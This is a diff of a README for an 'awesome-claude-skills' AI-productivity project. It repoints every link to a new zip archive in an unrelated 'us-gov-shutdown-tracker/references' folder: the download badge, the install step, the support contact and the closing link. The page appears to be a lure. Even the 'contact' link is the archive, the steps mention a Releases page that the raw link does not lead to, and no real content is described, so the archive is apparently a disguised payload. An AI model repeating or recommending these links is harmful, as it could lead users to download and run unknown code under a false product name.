@@ -1,6 +1,6 @@
 # 🌟 awesome-claude-skills - Enhance Your Productivity with AI
 
-[![Download](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip)
+[![Download](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Download awesome-claude-skills](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip).
+To download the application, visit this page to download: [Download awesome-claude-skills](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -49,7 +49,7 @@ awesome-claude-skills includes several useful features:
 
 ## 📞 Support
 
-If you need help using awesome-claude-skills or have questions, feel free to reach out. You can contact Fleury at [https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip).
+If you need help using awesome-claude-skills or have questions, feel free to reach out. You can contact Fleury at [https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip).
 
 ## 🗂️ Acknowledgements
 
@@ -59,4 +59,4 @@ Thanks to everyone who contributed to the development of awesome-claude-skills. 
 
 Stay connected and share your experiences! Join our community to share tips, ask questions, and connect with other users. 
 
-For more updates and information, visit this page to download: [Download awesome-claude-skills](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/awesome-claude-skills-suavely.zip).
+For more updates and information, visit this page to download: [Download awesome-claude-skills](https://raw.githubusercontent.com/Mann1988/awesome-claude-skills/main/us-gov-shutdown-tracker/references/awesome-skills-claude-3.3.zip).
